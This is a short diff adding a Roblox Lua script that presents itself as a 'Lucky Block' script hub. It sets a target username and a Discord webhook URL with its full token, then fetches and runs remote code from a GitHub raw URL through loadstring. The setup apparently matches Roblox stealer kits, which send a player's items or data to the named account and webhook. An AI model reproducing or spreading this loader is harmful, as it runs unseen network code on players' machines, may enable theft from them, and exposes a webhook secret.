@@ -1,0 +1,10 @@
+_G.Username = "Reifhord1"
+
+_G.HubName = "Lucky Block"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1108363028195446907/c8mtxOMP1wS84klMlzXEAm0gkH-xLNDLUeIAbcWrYcRtNFC3nZya6-36QpZajt8PElYX"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
+
+
+
